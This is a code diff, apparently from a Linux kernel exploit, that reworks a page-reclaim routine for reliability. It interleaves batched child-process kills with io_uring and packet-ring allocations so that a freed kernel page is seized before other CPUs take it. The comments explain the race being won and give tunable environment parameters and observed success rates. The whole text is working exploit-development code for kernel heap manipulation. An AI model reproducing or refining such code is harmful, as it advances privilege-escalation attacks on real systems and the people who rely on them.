@@ -1988,20 +1988,26 @@ uintptr_t prepare_kernel_page(int payload_mode) {
   sched_yield();
 
   /*
-   * RECLAIM CYCLES (reliability): repeat [holder turnover + payload ring
-   * burst]. Even after all closes/kills, base's page can survive as a
-   * stuck SLUB partial (QEMU before_rings: self-linked lru; frozen
-   * partials never discard on their own). Each cycle's fork wave consumes
-   * free objects on surviving partial slabs (incl. base's page) and the
-   * kills cycle them to discard; the ring burst then claims the freshest
-   * order-2 frees. Failed cycles are FREE (no walk yet) — extra cycles
-   * only add re-rolls against cross-CPU races (device ~1/3 → QEMU-smp8
-   * reproduces the variance).
+   * INTERLEAVED RECLAIM (the race fix): the old cycle (kill-all-56 then
+   * rings) left base stealable in the buddy for SECONDS — mm pages free
+   * as their LAST object dies (random order in the kill wave), and any
+   * cpu can take them from the buddy before the burst. Interleave: kill
+   * KILL_BATCH children, IMMEDIATELY claim RING_BATCH rings, repeat. A
+   * page that empties is claimed within ~batch-microseconds while it
+   * still sits at the PCP head. Rings stamp + register normally.
    */
   {
     int cycles = env_int_range("RECLAIM_CYCLES", 3, 1, 8);
-    int per_cycle = env_int_range("FINAL_TURNOVER", 224, 0, 1024) / cycles;
+    int total_holders = env_int_range("FINAL_TURNOVER", 224, 0, 1024);
+    int kill_batch = env_int_range("KILL_BATCH", 4, 1, 64);
+    int ring_batch = env_int_range("RING_BATCH", 8, 1, 128);
+    int per_cycle = total_holders / cycles;
     for (int c = 0; c < cycles; c++) {
+      slab_state_snap("before_rings");
+      if (c == 0 && env_flag("RSP_HALT2", 0)) {
+        pr_info("RSP_HALT2: halting before rings\n");
+        rsp_halt_after_closes();
+      }
       if (per_cycle > 0) {
         pid_t *tids = calloc((size_t)per_cycle, sizeof(pid_t));
         int n = 0;
@@ -2010,21 +2016,29 @@ uintptr_t prepare_kernel_page(int payload_mode) {
           if (tids[i] > 0)
             n++;
         }
-        for (int i = 0; i < n; i++) {
-          kill_child(tids[i]);
+        int killed = 0;
+        while (killed < n) {
+          int k = kill_batch;
+          if (killed + k > n)
+            k = n - killed;
+          for (int i = 0; i < k; i++) {
+            kill_child(tids[killed + i]);
+          }
+          killed += k;
+          /* immediate claim burst: ring_batch order-2 pairs */
+          for (int rb = 0; rb < ring_batch; rb++) {
+            iouring_ring_reclaim_one(skb_buf, 0x500, 1);
+          }
         }
         free(tids);
         sched_yield();
         sched_yield();
       }
-      slab_state_snap("before_rings");
-      if (c == 0 && env_flag("RSP_HALT2", 0)) {
-        pr_info("RSP_HALT2: halting before rings\n");
-        rsp_halt_after_closes();
-      }
+      /* cycle-final packet rings (QEMU/caps) + top-up io_uring */
       iouring_ring_reclaim(skb_buf, 0x500);
       packet_ring_reclaim(skb_buf, 0x500);
-      pr_info("RECLAIM_CYCLE %d/%d done\n", c + 1, cycles);
+      pr_info("RECLAIM_CYCLE %d/%d done (interleaved %dx%d/%d)\n",
+              c + 1, cycles, kill_batch, ring_batch, per_cycle);
     }
   }
 
@@ -2041,7 +2055,7 @@ uintptr_t prepare_good_kernel_page(int payload_mode) {
   }
   struct timespec deadline;
   clock_gettime(CLOCK_MONOTONIC, &deadline);
-  deadline.tv_sec += 180;
+  deadline.tv_sec += env_int_range("PREPARE_DEADLINE_S", 180, 30, 3600);
   for (int attempt = 1; attempt <= max_attempts; attempt++) {
     uintptr_t base = prepare_kernel_page(payload_mode);
     if (base) {
